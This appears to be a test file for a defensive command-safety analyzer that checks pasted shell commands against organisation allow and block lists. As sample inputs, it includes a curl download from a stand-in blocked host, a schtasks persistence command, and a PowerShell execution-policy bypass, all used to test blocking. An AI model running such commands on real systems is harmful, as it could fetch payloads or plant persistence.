import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { analyze, explain, normalizeForHash, sha256Hex } from '../src/index.ts';

test('sha256Hex matches the standard test vectors and node:crypto', () => {
  assert.equal(sha256Hex(''), 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855');
  assert.equal(sha256Hex('abc'), 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  for (const s of ['a'.repeat(55), 'a'.repeat(56), 'a'.repeat(64), 'हिन्दी ಕನ್ನಡ 🦉', 'x'.repeat(100_000)]) {
    assert.equal(sha256Hex(s), createHash('sha256').update(s, 'utf8').digest('hex'), `${s.length} chars`);
  }
});

const SETUP = 'powershell -ExecutionPolicy Bypass -File \\\\fileserver\\it\\lab-setup.ps1';

test('an approved command passes, matched by fingerprint, even with no custody record', () => {
  assert.notEqual(analyze(SETUP, { target: 'run' }).action, 'allow');
  const approved = { approvedHashes: [sha256Hex(normalizeForHash(SETUP))] };
  const v = analyze(SETUP, { target: 'run', org: approved });
  assert.equal(v.action, 'allow');
  assert.ok(v.findings.some((f) => f.id === 'org-approved'));
  // Whitespace differences normalise away; any other change does not.
  assert.equal(analyze(`  ${SETUP.replace(' -File', '   -File')} `, { target: 'run', org: approved }).action, 'allow');
  assert.notEqual(analyze(SETUP.replace('lab-setup', 'lab-setup2'), { target: 'run', org: approved }).action, 'allow');
});

test('a command contacting an organisation-blocked host is always blocked', () => {
  const org = { blockedHosts: ['bad-campaign.test'] };
  const v = analyze('curl -o tool.zip https://cdn.bad-campaign.test/tool.zip', { target: 'terminal', org });
  assert.equal(v.action, 'block');
  assert.equal(v.risk, 100);
  assert.equal(explain(v, null, 'hi').details[0], 'यह cdn.bad-campaign.test से जुड़ता है, जिसे आपके संगठन ने ब्लॉक किया है।');
});

test('merely mentioning a blocked host (to report it) is not blocked', () => {
  const org = { blockedHosts: ['bad-campaign.test'] };
  assert.equal(analyze('https://bad-campaign.test/verify', { target: 'web', org }).action, 'allow');
  assert.equal(analyze('look-alike: https://notbad-campaign.test/x', { org }).action, 'allow');
});

test('copying from a blocked site adds weight but never prompts by itself', () => {
  const org = { blockedHosts: ['bad-campaign.test'] };
  const custody = { sourceKind: 'browser' as const, originUrl: 'https://bad-campaign.test/', scriptWritten: false, visibleMatch: true };
  assert.equal(analyze('git status', { target: 'terminal', custody, org }).action, 'allow');
  const v = analyze('schtasks /create /tn x /tr C:\\x.bat /sc daily', { target: 'terminal', custody, org });
  assert.ok(v.findings.some((f) => f.id === 'org-blocked-origin'));
  assert.equal(v.action, 'block');
});
